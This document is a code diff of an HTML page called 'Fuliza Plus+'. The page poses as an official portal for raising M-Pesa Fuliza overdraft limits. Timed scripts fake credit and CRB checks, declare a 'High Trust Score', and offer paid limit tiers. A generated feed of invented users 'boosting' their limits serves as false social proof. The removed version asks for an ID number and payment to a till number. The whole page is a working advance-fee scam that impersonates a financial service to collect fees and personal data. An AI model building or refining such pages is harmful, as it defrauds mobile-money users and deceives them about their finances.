@@ -1,245 +1,283 @@
-<!DOCTYPE html><html lang="en">
+<!DOCTYPE html>
+<html lang="en">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>FulizaBoost</title><style>
-body{
-  margin:0;
-  font-family:sans-serif;
-  background:#f4f6f8;
-  display:flex;
-  justify-content:center;
-  align-items:center;
-  height:100vh;
+<title>Fuliza Plus</title>
+
+<style>
+body {
+  margin: 0;
+  font-family: Arial, sans-serif;
+  background: #f3f4f6;
+}
+
+.container {
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  height: 100vh;
 }
 
 /* CARD */
-.card{
-  width:90%;
-  max-width:360px;
-  background:#fff;
-  padding:25px;
-  border-radius:25px;
-  text-align:center;
-  box-shadow:0 10px 40px rgba(0,0,0,0.08);
+.card {
+  width: 90%;
+  max-width: 360px;
+  background: #fff;
+  border-radius: 20px;
+  padding: 25px;
+  text-align: center;
+  box-shadow: 0 10px 25px rgba(0,0,0,0.1);
 }
 
-.hidden{display:none;}
+/* ICONS */
+.icon {
+  width: 70px;
+  height: 70px;
+  background: #e6f4ea;
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  margin: 0 auto 15px;
+  font-size: 30px;
+  color: #16a34a;
+}
 
-/* ICON */
-.icon{
-  width:90px;
-  height:90px;
-  background:#e6f4ea;
-  border-radius:50%;
-  display:flex;
-  align-items:center;
-  justify-content:center;
-  margin:0 auto 15px;
-  font-size:40px;
+.success-icon {
+  width: 70px;
+  height: 70px;
+  background: #16a34a;
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  margin: 0 auto 15px;
+  font-size: 30px;
+  color: #fff;
 }
 
 /* TEXT */
-.subtitle{
-  color:#16a34a;
-  font-size:13px;
-  letter-spacing:1px;
-  margin-bottom:10px;
+.title {
+  font-size: 20px;
+  font-weight: bold;
 }
 
-.desc{
-  color:#666;
-  font-size:14px;
+.subtitle {
+  color: #16a34a;
+  font-size: 12px;
+}
+
+.desc {
+  font-size: 14px;
+  color: #666;
+  margin-top: 8px;
 }
 
 /* INPUT */
-.input-box{
-  margin-top:20px;
-  background:#f1f5f9;
-  border-radius:12px;
-  padding:12px;
-  display:flex;
-  align-items:center;
-}
-
-.input-box input{
-  border:none;
-  outline:none;
-  background:transparent;
-  width:100%;
-  font-size:16px;
+input {
+  width: 100%;
+  padding: 14px;
+  border-radius: 10px;
+  border: 1px solid #ddd;
+  margin: 15px 0;
 }
 
 /* BUTTON */
-button{
-  width:100%;
-  padding:15px;
-  border:none;
-  border-radius:12px;
-  margin-top:20px;
-  font-size:16px;
-  font-weight:bold;
-  cursor:pointer;
-}
-
-.green{background:#16a34a;color:#fff;}
-.gray{background:#e5e5e5;}
-
-/* FOOT */
-.footer{
-  margin-top:15px;
-  font-size:12px;
-  color:#888;
+button {
+  width: 100%;
+  padding: 14px;
+  border: none;
+  background: #16a34a;
+  color: #fff;
+  border-radius: 10px;
+  font-size: 16px;
+  cursor: pointer;
 }
 
 /* LOADER */
-.spinner{
-  width:60px;
-  height:60px;
-  border:6px solid #ddd;
-  border-top:6px solid #16a34a;
-  border-radius:50%;
-  margin:0 auto 20px;
-  animation:spin 1s linear infinite;
+.loader {
+  width: 50px;
+  height: 50px;
+  border: 5px solid #e5e7eb;
+  border-top: 5px solid #16a34a;
+  border-radius: 50%;
+  animation: spin 1s linear infinite;
+  margin: 0 auto 15px;
 }
 
-@keyframes spin{
-  100%{transform:rotate(360deg);}
+@keyframes spin {
+  to { transform: rotate(360deg); }
 }
 
-/* SUCCESS */
-.check{
-  font-size:50px;
-  color:#16a34a;
+/* GRID */
+.grid {
+  display: grid;
+  grid-template-columns: 1fr 1fr;
+  gap: 12px;
+  margin-top: 15px;
 }
 
-/* LIMITS */
-.limits{
-  display:grid;
-  grid-template-columns:1fr 1fr;
-  gap:10px;
-  margin-top:20px;
+.box {
+  padding: 15px;
+  border-radius: 12px;
+  background: #f1f5f9;
+  text-align: center;
+  font-weight: bold;
+  color: #16a34a;
+  cursor: pointer;
 }
 
-.box{
-  border:1px solid #eee;
-  border-radius:12px;
-  padding:15px;
-  cursor:pointer;
+.box small {
+  display: block;
+  color: #777;
+  font-weight: normal;
+  margin-top: 5px;
 }
 
-.box.active{
-  border:2px solid #16a34a;
-  background:#ecfdf5;
+.box.active {
+  border: 2px solid #16a34a;
+  background: #e6f4ea;
 }
 
-/* FINAL */
-.header{
-  background:#16a34a;
-  color:#fff;
-  padding:15px;
-  border-radius:15px 15px 0 0;
-  margin:-25px -25px 20px -25px;
-  text-align:left;
+/* LIVE BOX */
+.live-box {
+  background: #fff;
+  border-radius: 12px;
+  padding: 10px;
+  margin-bottom: 15px;
+  font-size: 13px;
+  color: #333;
+  box-shadow: 0 5px 15px rgba(0,0,0,0.08);
+  text-align: center;
 }
 
-.notice{
-  background:#e6f4ea;
-  padding:12px;
-  border-radius:10px;
-  font-size:14px;
+.live-box span {
+  color: #16a34a;
+  font-weight: bold;
 }
 
-.flex{display:flex; gap:10px;}
-</style></head><body><!-- STEP 1 (NEW DESIGN) --><div class="card" id="step1">  <div class="icon">👤</div>  <h2>Fuliza Plus+</h2>
-  <div class="subtitle">OFFICIAL VERIFICATION PORTAL</div>  <p class="desc">
-    Verify your identity to unlock higher daily transaction limits.
-  </p>  <div class="input-box">
-    <input id="phone" placeholder="Enter M-Pesa Number">
-  </div>  <button class="green" onclick="startProcess()">
-    Check My Eligibility →
-  </button>  <div class="footer">
-    ● 136 USERS ONLINE &nbsp; | &nbsp; 🔒 SSL SECURED
-  </div></div><!-- STEP 2 --><div class="card hidden" id="step2">
-  <div class="spinner"></div>
-  <h3 id="loadingText">Connecting...</h3>
-</div><!-- STEP 3 --><div class="card hidden" id="step3">
-  <div class="check">✓</div>
-  <h2>Approved</h2>
-  <p><span id="userNumber"></span> eligible for upgrade</p>
-  <button class="green" onclick="showLimits()">Continue</button>
-</div><!-- LIMITS --><div class="card hidden" id="limits">
-  <h3>Select Your New Limit</h3>  <div class="limits">
-    <div class="box">Ksh 3,000<br>Fee: 250</div>
-    <div class="box">Ksh 5,000<br>Fee: 293</div>
-    <div class="box">Ksh 7,500<br>Fee: 350</div>
-    <div class="box">Ksh 10,000<br>Fee: 500</div>
-    <div class="box">Ksh 12,500<br>Fee: 747</div>
-    <div class="box">Ksh 16,000<br>Fee: 898</div>
-    <div class="box">Ksh 21,000<br>Fee: 1015</div>
-    <div class="box">Ksh 25,500<br>Fee: 1220</div>
-    <div class="box">Ksh 30,000<br>Fee: 1533</div>
-    <div class="box">Ksh 35,000<br>Fee: 1730</div>
-    <div class="box">Ksh 45,000<br>Fee: 2000</div>
-    <div class="box">Ksh 60,000<br>Fee: 2250</div>
-    <div class="box">Ksh 70,000<br>Fee: 2500</div>
-  </div><button class="green" onclick="upgrade()">UPGRADE</button>
+.hidden {
+  display: none;
+}
+</style>
+</head>
 
-</div><!-- FINAL STEP --><div class="card hidden" id="finalStep">  <div class="header">
-    <small>SECURE FULIZA APPLICATION</small>
-    <h3>Limit will be boosted</h3>
-  </div>  <div class="notice">
-    Enter your Safaricom number. Pay to Till Number <b>6363781</b>.
-  </div>  <input placeholder="ID Number">
-  <input id="finalPhone">  <div class="flex">
-    <button class="gray" onclick="location.reload()">Cancel</button>
-    <button class="green">Pay Ksh 250</button>
-  </div></div><script>
-// FLOW
-function startProcess(){
-  let phone=document.getElementById("phone").value;
-  if(!phone){alert("Enter phone");return;}
+<body>
 
-  document.getElementById("step1").classList.add("hidden");
-  document.getElementById("step2").classList.remove("hidden");
+<div class="container">
 
-  let steps=["Connecting...","Checking...","Verifying...","Done"];
-  let i=0;
+<!-- STEP 1 -->
+<div class="card" id="step1">
+  <div class="icon">👤</div>
+  <div class="title">Fuliza Plus+</div>
+  <div class="subtitle">OFFICIAL VERIFICATION PORTAL</div>
+  <div class="desc">Verify your identity to unlock higher limits.</div>
+  <input type="text" id="phone" placeholder="Enter M-Pesa Number">
+  <button onclick="startProcess()">Check My Eligibility</button>
+</div>
 
-  let interval=setInterval(()=>{
-    document.getElementById("loadingText").innerText=steps[i];
-    i++;
+<!-- STEPS -->
+<div class="card hidden" id="step2"><div class="loader"></div><div class="title">Connecting...</div><div class="desc">Accessing secure databases...</div></div>
+<div class="card hidden" id="step3"><div class="loader"></div><div class="title">Checking Usage History...</div><div class="desc">Accessing secure databases...</div></div>
+<div class="card hidden" id="step4"><div class="loader"></div><div class="title">Verifying CRB Status...</div><div class="desc">Accessing secure databases...</div></div>
+<div class="card hidden" id="step5"><div class="loader"></div><div class="title">Finalizing Trust Score...</div><div class="desc">Accessing secure databases...</div></div>
 
-    if(i>=steps.length){
-      clearInterval(interval);
-      setTimeout(()=>{
-        step2.classList.add("hidden");
-        step3.classList.remove("hidden");
-        userNumber.innerText=phone;
-      },800);
-    }
-  },1500);
+<!-- STEP 6 -->
+<div class="card hidden" id="step6">
+  <div class="success-icon">✔</div>
+  <div class="title">Congratulations!</div>
+  <div class="desc">
+    High Trust Score Detected.<br>
+    <b id="userNumber"></b>
+  </div>
+  <div class="desc">Limit up to <b style="color:#16a34a;">KSh 70,000</b></div>
+</div>
+
+<!-- STEP 7 -->
+<div class="card hidden" id="step7">
+
+  <!-- LIVE ACTIVITY -->
+  <div id="liveBox" class="live-box hidden">
+    <span id="liveText"></span>
+  </div>
+
+  <div class="title">Select Your New Approved Limit</div>
+
+  <div class="grid">
+    <div class="box">Ksh 3,000<small>Fee: 250</small></div>
+    <div class="box">Ksh 5,000<small>Fee: 293</small></div>
+    <div class="box">Ksh 7,500<small>Fee: 350</small></div>
+    <div class="box">Ksh 10,000<small>Fee: 500</small></div>
+    <div class="box">Ksh 12,500<small>Fee: 747</small></div>
+    <div class="box">Ksh 16,000<small>Fee: 898</small></div>
+    <div class="box">Ksh 21,000<small>Fee: 1015</small></div>
+    <div class="box">Ksh 25,500<small>Fee: 1220</small></div>
+    <div class="box">Ksh 30,000<small>Fee: 1533</small></div>
+    <div class="box">Ksh 35,000<small>Fee: 1730</small></div>
+    <div class="box active">Ksh 45,000<small>Fee: 2000</small></div>
+    <div class="box">Ksh 60,000<small>Fee: 2250</small></div>
+    <div class="box">Ksh 70,000<small>Fee: 2500</small></div>
+  </div>
+
+  <br>
+  <button id="upgradeBtn">⚡ UPGRADE TO KSH 45,000</button>
+
+</div>
+
+</div>
+
+<script>
+function startProcess() {
+  let number = document.getElementById("phone").value;
+  document.getElementById("userNumber").innerText = number;
+
+  showStep("step1","step2");
+  setTimeout(()=>showStep("step2","step3"),2000);
+  setTimeout(()=>showStep("step3","step4"),4000);
+  setTimeout(()=>showStep("step4","step5"),6000);
+  setTimeout(()=>showStep("step5","step6"),8000);
+  setTimeout(()=>showStep("step6","step7"),10000);
+
+  // SHOW LIVE ACTIVITY
+  setTimeout(() => {
+    document.getElementById("liveBox").classList.remove("hidden");
+    updateLive();
+    setInterval(updateLive, 3000);
+  }, 10500);
 }
 
-function showLimits(){
-  step3.classList.add("hidden");
-  limits.classList.remove("hidden");
+function showStep(hide, show) {
+  document.getElementById(hide).classList.add("hidden");
+  document.getElementById(show).classList.remove("hidden");
 }
 
-document.querySelectorAll(".box").forEach(box=>{
-  box.onclick=()=>{
-    document.querySelectorAll(".box").forEach(b=>b.classList.remove("active"));
+/* SELECT LIMIT */
+document.querySelectorAll(".box").forEach(box => {
+  box.onclick = () => {
+    document.querySelectorAll(".box").forEach(b => b.classList.remove("active"));
     box.classList.add("active");
-  }
+    let amount = box.innerText.split("\n")[0];
+    document.getElementById("upgradeBtn").innerText = "⚡ UPGRADE TO " + amount.toUpperCase();
+  };
 });
 
-function upgrade(){
-  let selected=document.querySelector(".box.active");
-  if(!selected){alert("Select a limit");return;}
+/* LIVE ACTIVITY */
+const names = ["Brian O.","Kevin M.","Faith N.","James K.","Mary A.","Peter W."];
+const amounts = ["Ksh 3,000","Ksh 5,000","Ksh 10,000","Ksh 21,000","Ksh 45,000","Ksh 70,000"];
 
-  limits.classList.add("hidden");
-  finalStep.classList.remove("hidden");
-  finalPhone.value=phone.value;
+function randomMask() {
+  let num = Math.floor(700000000 + Math.random()*100000000);
+  return num.toString().slice(0,4) + "****" + num.toString().slice(-2);
 }
-</script></body>
+
+function updateLive() {
+  let name = names[Math.floor(Math.random()*names.length)];
+  let amount = amounts[Math.floor(Math.random()*amounts.length)];
+  document.getElementById("liveText").innerHTML =
+    `${name} (${randomMask()}) boosted to <span>${amount}</span> just now`;
+}
+</script>
+
+</body>
 </html>
